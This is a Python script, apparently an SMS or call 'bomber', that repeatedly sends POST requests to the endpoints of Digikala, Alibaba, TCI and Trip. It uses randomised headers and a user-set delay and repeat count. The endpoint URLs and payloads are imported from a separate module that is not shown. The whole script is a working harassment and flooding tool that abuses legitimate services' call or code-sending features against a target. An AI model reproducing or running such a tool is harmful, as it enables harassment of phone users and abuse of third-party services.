import requests
import random
import time

#########################
black = '\033[30m'
white = '\033[37m'
Blue ="\033[1;34m"
yellow = '\033[33m'
Red="\033[1;31m"
Green="\033[1;33m"
pink = "\033[95m"
Grey="\033[1;30m"
Reset="\033[0m"
cyan = "\033[36m"
purple = "\033[35m"
#########################

from date_call import *

attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset))) 

sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))

numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))



i = 0


    



attacks = [
    ("Digikala", url_call_digikala, json_call_digikala),
    ("Alibaba", url_call_alibaba, json_call_alibaba),
    ("TCI", url_call_tci, json_call_tci),
    ("Trip", url_trip, json_trip)
]




while i < numbert:
    random_head = random.choice(heads)
    selected_attacks = random.sample(attacks, 2)

    for index, (name, url, data) in enumerate(selected_attacks):
        response = requests.post(url, json=data, headers=random_head)
        print(f"{name}: {response}")
        time.sleep(sleep_time)






 



    print([Blue + "Send all requests"])
    time.sleep(attack_speed)
    i += 1